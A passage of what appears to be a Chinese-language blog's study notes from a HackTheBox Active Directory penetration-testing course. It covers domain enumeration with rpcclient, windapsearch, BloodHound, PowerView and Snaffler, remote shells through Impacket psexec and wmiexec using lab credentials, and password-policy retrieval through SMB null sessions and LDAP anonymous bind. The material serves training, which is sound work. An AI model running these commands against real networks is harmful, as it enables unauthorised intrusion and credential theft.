logon_divs:     168        bad_password_count:     0x00000000        logon_count:    0x0000001d        padding1[0..7]...        logon_hrs[0..21]...</code></pre><h4 id="Enumdomusers"><a href="#Enumdomusers" class="headerlink" title="Enumdomusers"></a>Enumdomusers</h4><pre><code class="shell-session">rpcclient $&gt; enumdomusersuser:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]user:[pfalcon] rid:[0x459]user:[fanthony] rid:[0x45a]user:[wdillard] rid:[0x45b]user:[lbradford] rid:[0x45c]user:[sgage] rid:[0x45d]user:[asanchez] rid:[0x45e]user:[dbranch] rid:[0x45f]user:[ccruz] rid:[0x460]user:[njohnson] rid:[0x461]user:[mholliday] rid:[0x462]&lt;SNIP&gt;  </code></pre><h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><p> <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></p><p>Impacket套件中最有用的工具之一是psexec.py。psexec.py是Sysinternals psexec可执行文件的克隆，但工作方式与原始文件略有不同。该工具通过将随机命名的可执行文件上载到目标主机上的ADMIN$共享来创建远程服务。然后，它通过RPC和Windows服务控制管理器注册服务。一旦建立，通信就通过命名管道进行，作为SYSTEM在受害者主机上提供一个交互式远程shell。</p><h4 id="Using-psexec-py"><a href="#Using-psexec-py" class="headerlink" title="Using psexec.py"></a>Using psexec.py</h4><pre><code class="bash">psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></pre><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></p><p>Wmiexec.py利用了一个半交互式shell，通过Windows Management Instrumentation执行命令。它不会在目标主机上丢弃任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它以我们连接的本地管理员用户的身份运行（对于寻找入侵的人来说，这可能比看到SYSTEM执行许多命令更不明显）。与其他工具相比，这是一种在主机上更隐蔽的执行方法，但仍可能被大多数现代反病毒和EDR系统所捕获。我们将使用与psexec.py相同的帐户来访问主机。</p><pre><code class="bash">wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></pre><p>请注意，此shell环境不是完全交互式的，因此发出的每个命令都将从WMI执行一个新的cmd.exe并执行您的命令。这样做的缺点是，如果警惕的防御者检查事件日志并查看事件ID 4688：已经创建了一个新进程，他们将看到一个创建的新进程来生成cmd.exe并发出命令。</p><h2 id="Windapsearch"><a href="#Windapsearch" class="headerlink" title="Windapsearch"></a>Windapsearch</h2><p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a>是另一个方便的Python脚本，我们可以使用LDAP查询从Windows域中枚举用户、组和计算机。</p><p>我们使用Windapsearch有几个选项来执行标准枚举（转储用户、计算机和组）和更详细的枚举。–da（枚举域管理员组成员）选项和-PU（查找特权用户）选项。-PU选项很有趣，因为它将对具有嵌套组成员身份的用户执行递归搜索。</p><h4 id="Windapsearch-Domain-Admins"><a href="#Windapsearch-Domain-Admins" class="headerlink" title="Windapsearch - Domain Admins"></a>Windapsearch - Domain Admins</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></pre><p>为了识别更多的潜在用户，我们可以使用-PU标志运行该工具，并检查是否有可能未被注意到的特权提升的用户。这是一个很好的报告检查，因为它很可能会通知客户具有嵌套组成员资格的多余权限的用户。</p><h4 id="Windapsearch-Privileged-Users"><a href="#Windapsearch-Privileged-Users" class="headerlink" title="Windapsearch - Privileged Users"></a>Windapsearch - Privileged Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></pre><pre><code class="shell-session">&lt;SNIP&gt;[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL[+]     Found 3 nested users for group Enterprise Admins:cn: AdministratoruserPrincipalName: administrator@inlanefreight.localcn: lab_admcn: Sharepoint AdminuserPrincipalName: sp-admin@INLANEFREIGHT.LOCAL&lt;SNIP&gt;</code></pre><h2 id="Bloodhound-py"><a href="#Bloodhound-py" class="headerlink" title="Bloodhound.py"></a>Bloodhound.py</h2><p>BloodHound是有史以来发布的用于审计Active Directory安全性的最具影响力的工具之一，它对我们作为渗透测试人员来说非常有益。我们可以获取大量耗时的数据，以筛选和创建图形表示或特定用户访问可能导致的“攻击路径”。</p><p>该工具从AD收集数据，如用户、组、计算机、组成员资格、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP访问、WinRM访问等。 它最初只与PowerShell收集器一起发布，因此必须从Windows主机上运行。最终，一个社区成员发布了一个Python端口（需要Impacket、ldap3和dnspython）。当我们有有效的域凭据，但没有访问加入域的Windows主机的权限，或者没有运行SharpHound收集器的Windows攻击主机时，这在渗透测试中帮助很大。这也有助于我们不必从域主机运行收集器，因为域主机可能会被阻止或引发警报（尽管在保护良好的环境中，即使从攻击主机运行收集器也很可能引发警报）。</p><p>该工具接受带有-c或–collectionmethod标志的各种收集方法。我们可以检索特定的数据，如用户会话、用户和组、对象属性、ACLS，或者全选以收集尽可能多的数据。（ user sessions, users and groups, object properties, ACLS,）</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all INFO: Found AD domain: inlanefreight.localINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 1 domainsINFO: Found 2 domains in the forestINFO: Found 564 computersINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 2951 usersINFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 183 groupsINFO: Found 2 trustsINFO: Starting computer enumeration with 10 workers&lt;SNIP&gt;</code></pre><h4 id="Viewing-the-Results"><a href="#Viewing-the-Results" class="headerlink" title="Viewing the Results"></a>Viewing the Results</h4><h4 id="Upload-the-Zip-File-into-the-BloodHound-GUI"><a href="#Upload-the-Zip-File-into-the-BloodHound-GUI" class="headerlink" title="Upload the Zip File into the BloodHound GUI"></a>Upload the Zip File into the BloodHound GUI</h4><p>然后，我们可以键入sudo neo4j start来启动<a href="https://neo4j.com/">neo4j</a>服务，启动我们将加载数据的数据库，并对其运行Cypher查询。</p><p> <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">custom Cypher queries</a></p><h1 id="Credentialed-Enumeration-from-Windows"><a href="#Credentialed-Enumeration-from-Windows" class="headerlink" title="-Credentialed Enumeration - from Windows-"></a>-Credentialed Enumeration - from Windows-</h1><h4 id="Discover-Modules"><a href="#Discover-Modules" class="headerlink" title="Discover Modules"></a>Discover Modules</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ModuleModuleType Version    Name                                ExportedCommands---------- -------    ----                                ----------------Manifest   3.1.0.0    Microsoft.PowerShell.Utility        &#123;Add-Member, Add-Type, Clear-Variable, Compare-Object...&#125;Script     2.0.0      PSReadline                          &#123;Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...</code></pre><h4 id="Load-ActiveDirectory-Module"><a href="#Load-ActiveDirectory-Module" class="headerlink" title="Load ActiveDirectory Module"></a>Load ActiveDirectory Module</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module ActiveDirectoryPS C:\htb&gt; Get-Module</code></pre><p>现在我们的模块已经加载完毕，让我们开始吧。首先，我们将使用 <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps">Get-ADDomain</a>枚举有关域的一些基本信息。</p><h3 id="Get-Domain-Info"><a href="#Get-Domain-Info" class="headerlink" title="Get Domain Info"></a>Get Domain Info</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADDomain</code></pre><p>这将打印出有用的信息，如域SID、域功能级别、任何子域等。接下来，我们将使用Get-ADUser cmdlet。我们将筛选已填充ServicePrincipalName属性的帐户。</p><h4 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></pre><p>我们可以使用ActiveDirectory模块运行的另一个有趣的检查是使用Get-ADTrust cmdlet验证域信任关系</p><h4 id="Checking-For-Trust-Relationships"><a href="#Checking-For-Trust-Relationships" class="headerlink" title="Checking For Trust Relationships"></a>Checking For Trust Relationships</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADTrust -Filter *</code></pre><p>此cmdlet将打印出域具有的任何信任关系。我们可以确定它们是我们林中的信任还是与其他林中的域的信任、信任类型、信任方向以及与之相关的域的名称。这将在以后利用父子信任关系和跨林信任进行攻击时非常有用。接下来，我们可以使用Get-ADGroup cmdlet收集AD组信息。</p><h4 id="Group-Enumeration"><a href="#Group-Enumeration" class="headerlink" title="Group Enumeration"></a>Group Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Filter * | select name</code></pre><p>我们可以获取结果，并将感兴趣的名称反馈到cmdlet中，以获取有关特定组的更详细信息，如下所示：</p><h4 id="Detailed-Group-Info"><a href="#Detailed-Group-Info" class="headerlink" title="Detailed Group Info"></a>Detailed Group Info</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Identity &quot;Backup Operators&quot;</code></pre><p>现在我们了解了更多关于该组的信息，让我们使用get-ADGroupMember cmdlet获取成员列表。</p><h3 id="Group-Membership"><a href="#Group-Membership" class="headerlink" title="Group Membership"></a>Group Membership</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></pre><p>接下来，我们将介绍PowerView工具，它具有许多简化枚举和深入挖掘领域的功能。</p><h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a></p><p>PowerView是一个用PowerShell编写的工具，用于帮助我们在AD环境中获得情境感知。与BloodHound非常相似，它提供了一种识别用户在网络上登录位置的方法，枚举域信息，如用户、计算机、组、ACLS、信任、查找文件共享和密码、执行Kerberoasting等。它是一个用途广泛的工具，可以让我们深入了解客户领域的安全状况。与BloodHound相比，它需要更多的手动工作来确定域内的错误配置和关系，但如果使用得当，可以帮助我们识别细微的错误配置。</p><h4 id="Domain-User-Information"><a href="#Domain-User-Information" class="headerlink" title="Domain User Information"></a>Domain User Information</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></pre><h4 id="Recursive-Group-Membership"><a href="#Recursive-Group-Membership" class="headerlink" title="Recursive Group Membership"></a>Recursive Group Membership</h4><pre><code class="powershell-session">PS C:\htb&gt;  Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></pre><p>上面我们对DomainAdmins组进行了递归查看，以列出其成员。现在我们知道了潜在特权提升的目标。与AD PowerShell模块一样，我们还可以枚举域信任映射。</p><h4 id="Trust-Enumeration"><a href="#Trust-Enumeration" class="headerlink" title="Trust Enumeration"></a>Trust Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainTrustMapping</code></pre><p>我们可以使用Test-AdminAccess功能在当前计算机或远程计算机上测试本地管理员访问。</p><h4 id="Testing-for-Local-Admin-Access"><a href="#Testing-for-Local-Admin-Access" class="headerlink" title="Testing for Local Admin Access"></a>Testing for Local Admin Access</h4><pre><code class="powershell-session">PS C:\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01ComputerName    IsAdmin------------    -------ACADEMY-EA-MS01    True </code></pre><p>上面，我们确定当前使用的用户是主机ACADEMY-EA-MS01上的管理员。我们可以对每个主机执行相同的功能，以查看我们在哪里可以进行管理访问。我们稍后将看到BloodHound执行这种检查的效果如何。现在，我们可以检查设置了SPN属性的用户，这表明该帐户可能受到Kerberoating攻击。</p><h4 id="Finding-Users-With-SPN-Set"><a href="#Finding-Users-With-SPN-Set" class="headerlink" title="Finding Users With SPN Set"></a>Finding Users With SPN Set</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></pre><h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>Finding Users With SPN Set</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Help</code></pre><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Identity forend</code></pre><h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>共享允许域中的用户快速访问与其日常角色相关的信息，并与组织共享内容。如果设置正确，域共享将要求用户加入域，并要求用户在访问系统时进行身份验证。权限也将到位，以确保用户只能访问和查看其日常角色所需的内容。过于宽松的共享可能会导致敏感信息的意外披露，尤其是那些包含医疗、法律、人事、人力资源、数据等的信息。在攻击中，获得对可以访问诸如IT&#x2F;基础设施共享之类的共享的标准域用户的控制可能导致诸如配置文件或诸如SSH密钥或密码之类的不安全存储的认证文件之类的敏感数据的泄露。我们希望发现任何类似的问题，以确保客户不会将任何数据暴露给日常工作中不需要访问的用户，并且他们符合任何法律&#x2F;法规要求（HIPAA、PCI等）。我们可以使用PowerView查找共享，然后帮助我们挖掘共享，或者使用各种手动命令查找常见字符串，如输入名称。这可能是一个乏味的过程，我们可能会错过一些东西，尤其是在大型环境中。现在，让我们花一些时间来探索Snafler工具，看看它如何帮助我们更准确、更高效地识别这些问题。</p><h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助我们在Active Directory环境中获取凭据或其他敏感数据的工具。Snafler的工作原理是获取域中的主机列表，然后枚举这些主机以获得共享和可读目录。一旦完成，它就会遍历用户可读的任何目录，并寻找可以帮助我们在评估中更好定位的文件。Snafler要求从加入域的主机或在域用户上下文中运行。 要执行Snafler，我们可以使用以下命令：</p><h4 id="Snaffler-Execution"><a href="#Snaffler-Execution" class="headerlink" title="Snaffler Execution"></a>Snaffler Execution</h4><pre><code class="bash">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</code></pre><p>-s命令告诉它为我们将结果打印到控制台，-d指定要在其中搜索的域，-o命令则告诉Snafler将结果写入日志文件。-v选项是详细级别。通常，数据是最好的，因为它只在屏幕上显示结果，所以开始查看工具运行更容易。Snafler可以产生大量的数据，所以我们通常应该输出到文件中，让它运行，然后再返回。在渗透测试期间，将Snafler原始输出作为补充数据提供给客户也很有帮助，因为这可以帮助他们锁定应该首先锁定的高价值股票。</p><pre><code class="powershell-session">PS C:\htb&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></pre><p>我们可能会找到密码、SSH密钥、配置文件或其他可用于进一步访问的数据。Snafler为我们对输出进行颜色编码，并为我们提供共享中文件类型的概要。 既然我们有了关于INLANEFREIGHT.LOCAL域的丰富数据（希望能清除注释和日志文件输出！），我们需要一种方法来关联它并将其可视化。让我们深入了解BloodHound，看看这个工具在任何以AD为中心的安全评估中有多强大。</p><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>Bloodhound是一款出色的开源工具，可以通过分析对象之间的关系来识别AD环境中的攻击路径。</p><p>我们必须从位于网络内（但未加入域）的Windows攻击主机中作为域用户进行身份验证，或者将工具转移到加入域的主机。</p><h4 id="SharpHound-in-Action"><a href="#SharpHound-in-Action" class="headerlink" title="SharpHound in Action"></a>SharpHound in Action</h4><pre><code class="powershell-session">PS C:\htb&gt;  .\SharpHound.exe --help</code></pre><p>我们将从MS01攻击主机运行SharpHound.exe收集器开始。</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT</code></pre><p>接下来，我们可以将数据集过滤到我们自己的虚拟机中，或者将其吸收到MS01上的BloodHound GUI工具中。</p><p>有时，我们会看到主机不再通电，但仍显示为AD中的记录。在报告中提出建议之前，我们应该始终验证它们是否“活动”。我们可能会为遗留操作系统写一个高风险的发现，或者为清理AD中的旧记录写一个最佳实践建议。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD_2</title>
      <link href="/2023/09/24/AD-2/"/>
      <url>/2023/09/24/AD-2/</url>
      
        <content type="html"><![CDATA[<ul><li>Sighting In, Hunting For A User</li><li>Spray Responsibly</li></ul><span id="more"></span><h2 id="Enumerating-the-Password-Policy-from-Linux-Credentialed"><a href="#Enumerating-the-Password-Policy-from-Linux-Credentialed" class="headerlink" title="Enumerating the Password Policy - from Linux - Credentialed"></a>Enumerating the Password Policy - from Linux - Credentialed</h2><p>我们可以通过多种方式提取域密码策略，具体取决于域的配置方式以及我们是否具有有效的域凭据。使用有效的域凭据，还可以使用CrackMapExec或rpcclient等工具远程获取密码策略。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-polSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHTSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not SetSMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Refuse Password Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Store Cleartext: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Lockout Admins: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Clear Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Anon Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Complex: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions"><a href="#Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions" class="headerlink" title="Enumerating the Password Policy - from Linux - SMB NULL Sessions"></a>Enumerating the Password Policy - from Linux - SMB NULL Sessions</h2><blockquote><p>SMB NULL Sessions（SMB空会话）是指在Microsoft Windows网络中的SMB（Server Message Block）协议中，允许未经身份验证的访问网络共享资源的一种机制。这是一种安全性问题，因为未经身份验证的用户可以访问共享文件夹和其他资源，可能导致潜在的安全风险和信息泄露。</p></blockquote><p>如果&#x3D;&#x3D;没有凭据&#x3D;&#x3D;，我们可以通过SMB NULL会话或LDAP匿名绑定获取密码策略。第一种是通过SMB NULL会话。SMB NULL会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。SMB NULL会话配置错误通常是由于旧版域控制器升级到位，最终导致不安全的配置，而这些配置默认存在于旧版本的Windows Server中。 在早期版本的Windows Server中创建域时，会向某些共享授予匿名访问权限，从而允许域枚举。SMB NULL会话可以轻松枚举。对于枚举，我们可以使用enum4linux、CrackMapExec、rpcclient等工具。 我们可以使用rpcclient检查域控制器的SMB NULL会话访问。 连接后，我们可以发出一个RPC命令，如querydominfo，以获取有关域的信息并确认NULL会话访问。</p><h4 id="Using-rpcclient"><a href="#Using-rpcclient" class="headerlink" title="Using rpcclient"></a>Using rpcclient</h4><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1</code></pre><h4 id="Obtaining-the-Password-Policy-using-rpcclient"><a href="#Obtaining-the-Password-Policy-using-rpcclient" class="headerlink" title="Obtaining the Password Policy using rpcclient"></a>Obtaining the Password Policy using rpcclient</h4><pre><code class="shell-session">rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1rpcclient $&gt; getdompwinfomin_password_length: 8password_properties: 0x00000001    DOMAIN_PASSWORD_COMPLEX</code></pre><h4 id="Using-enum4linux"><a href="#Using-enum4linux" class="headerlink" title="Using enum4linux"></a>Using enum4linux</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -P 172.16.5.5&lt;SNIP&gt; ================================================== |    Password Policy Information for 172.16.5.5    | ================================================== [+] Attaching to 172.16.5.5 using a NULL share[+] Trying protocol 139/SMB...    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)[+] Trying protocol 445/SMB...[+] Found domain(s):    [+] INLANEFREIGHT    [+] Builtin[+] Password Info for Domain: INLANEFREIGHT    [+] Minimum password length: 8    [+] Password history length: 24    [+] Maximum password age: Not Set    [+] Password Complexity Flags: 000001        [+] Domain Refuse Password Change: 0        [+] Domain Password Store Cleartext: 0        [+] Domain Password Lockout Admins: 0        [+] Domain Password No Clear Change: 0        [+] Domain Password No Anon Change: 0        [+] Domain Password Complex: 1    [+] Minimum password age: 1 day 4 minutes     [+] Reset Account Lockout Counter: 30 minutes     [+] Locked Account Duration: 30 minutes     [+] Account Lockout Threshold: 5    [+] Forced Log off Time: Not Set[+] Retieved partial password policy with rpcclient:Password Complexity: EnabledMinimum Password Length: 8enum4linux complete on Tue Feb 22 17:39:29 2022</code></pre><p>工具<a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>是对Python中enum4linux的重写，但具有其他功能，如将数据导出为YAML或JSON文件的能力，这些文件稍后可用于进一步处理数据或将其提供给其他工具。除其他功能外，它还支持彩色输出</p><h4 id="Using-enum4linux-ng"><a href="#Using-enum4linux-ng" class="headerlink" title="Using enum4linux-ng"></a>Using enum4linux-ng</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreightENUM4LINUX - next generation&lt;SNIP&gt; =======================================|    RPC Session Check on 172.16.5.5    | =======================================[*] Check for null session[+] Server allows session using username &#39;&#39;, password &#39;&#39;[*] Check for random user session[-] Could not establish random user session: STATUS_LOGON_FAILURE =================================================|    Domain Information via RPC for 172.16.5.5    | =================================================[+] Domain: INLANEFREIGHT[+] SID: S-1-5-21-3842939050-3880317879-2865463114[+] Host is part of a domain (not a workgroup) =========================================================|    Domain Information via SMB session for 172.16.5.5    |========================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found domain information via SMBNetBIOS computer name: ACADEMY-EA-DC01NetBIOS domain name: INLANEFREIGHTDNS domain: INLANEFREIGHT.LOCALFQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL =======================================|    Policies via RPC for 172.16.5.5    | =======================================[*] Trying port 445/tcp[+] Found policy:domain_password_information:  pw_history_length: 24  min_pw_length: 8  min_pw_age: 1 day 4 minutes  max_pw_age: not set  pw_properties:  - DOMAIN_PASSWORD_COMPLEX: true  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: falsedomain_lockout_information:  lockout_observation_window: 30 minutes  lockout_duration: 30 minutes  lockout_threshold: 5domain_logoff_information:  force_logoff_time: not setCompleted after 5.41 seconds</code></pre><h4 id="Displaying-the-contents-of-ilfreight-json"><a href="#Displaying-the-contents-of-ilfreight-json" class="headerlink" title="Displaying the contents of ilfreight.json"></a>Displaying the contents of ilfreight.json</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat ilfreight.json &#123;    &quot;target&quot;: &#123;        &quot;host&quot;: &quot;172.16.5.5&quot;,        &quot;workgroup&quot;: &quot;&quot;    &#125;,    &quot;credentials&quot;: &#123;        &quot;user&quot;: &quot;&quot;,        &quot;password&quot;: &quot;&quot;,        &quot;random_user&quot;: &quot;yxditqpc&quot;    &#125;,    &quot;services&quot;: &#123;        &quot;SMB&quot;: &#123;            &quot;port&quot;: 445,            &quot;accessible&quot;: true        &#125;,        &quot;SMB over NetBIOS&quot;: &#123;            &quot;port&quot;: 139,            &quot;accessible&quot;: true        &#125;    &#125;,    &quot;smb_dialects&quot;: &#123;        &quot;SMB 1.0&quot;: false,        &quot;SMB 2.02&quot;: true,        &quot;SMB 2.1&quot;: true,        &quot;SMB 3.0&quot;: true,        &quot;SMB1 only&quot;: false,        &quot;Preferred dialect&quot;: &quot;SMB 3.0&quot;,        &quot;SMB signing required&quot;: true    &#125;,    &quot;sessions_possible&quot;: true,    &quot;null_session_possible&quot;: true,&lt;SNIP&gt;</code></pre><h2 id="Enumerating-Null-Session-from-Windows"><a href="#Enumerating-Null-Session-from-Windows" class="headerlink" title="Enumerating Null Session - from Windows"></a>Enumerating Null Session - from Windows</h2><p>从Windows进行这种类型的空会话攻击并不常见，但我们可以使用命令<code>net use \\host\ipc$“”/u:“”</code>从Windows机器建立一个空会话，并确认我们是否可以执行更多这种类型的攻击。</p><h4 id="Establish-a-null-session-from-windows"><a href="#Establish-a-null-session-from-windows" class="headerlink" title="Establish a null session from windows"></a>Establish a null session from windows</h4><pre><code class="cmd-session">C:\htb&gt; net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;The command completed successfully.</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind"><a href="#Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind" class="headerlink" title="Enumerating the Password Policy - from Linux - LDAP Anonymous Bind"></a>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind</h2><p>LDAP匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。这是一种旧式配置，从Windows Server 2003开始，只有经过身份验证的用户才能启动LDAP请求。我们仍然不时看到这种配置，因为管理员可能需要设置一个特定的应用程序来允许匿名绑定，并提供超过预期数量的访问权限，从而允许未经身份验证的用户访问AD中的所有对象。 使用LDAP匿名绑定，我们可以使用特定于LDAP的枚举工具，如windapsearch.py、ldapsearch、ad-ldapdomaindump.py等，来提取密码策略。使用 <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>，它可能有点麻烦，但可行。获取密码策略的一个示例命令如下：</p><h4 id="Using-ldapsearch"><a href="#Using-ldapsearch" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLengthforceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 5maxPwdAge: -9223372036854775808minPwdAge: -864000000000minPwdLength: 8modifiedCountAtLastProm: 0nextRid: 1002pwdProperties: 1pwdHistoryLength: 24</code></pre><p>在这里，我们可以看到最小密码长度为8，锁定阈值为5，并且设置了密码复杂性（pwdProperties设置为1）。</p><h2 id="Enumerating-the-Password-Policy-from-Windows"><a href="#Enumerating-the-Password-Policy-from-Windows" class="headerlink" title="Enumerating the Password Policy - from Windows"></a>Enumerating the Password Policy - from Windows</h2><p>如果我们可以从Windows主机向域进行身份验证，我们可以使用内置的Windows二进制文件（如net.exe）来检索密码策略。我们还可以使用各种工具，如PowerView、CrackMapExec移植到Windows、SharpMapExec、SharpView等。 如果我们降落在Windows系统上，无法将工具传输到该系统，或者客户端将我们定位在Windows系统中，但无法将工具转移到该系统上，则使用内置命令会很有帮助。使用内置net.exe二进制文件的一个示例是：</p><pre><code class="cmd-session">C:\htb&gt; net accountsForce user logoff how long after time expires?:       NeverMinimum password age (days):                          1Maximum password age (days):                          UnlimitedMinimum password length:                              8Length of password history maintained:                24Lockout threshold:                                    5Lockout duration (minutes):                           30Lockout observation window (minutes):                 30Computer role:                                        SERVER</code></pre><p>在这里，我们可以收集以下信息： 密码永不过期（密码最长使用期限设置为无限制） 最小密码长度为8，因此可能使用弱密码 锁定阈值为5个错误密码 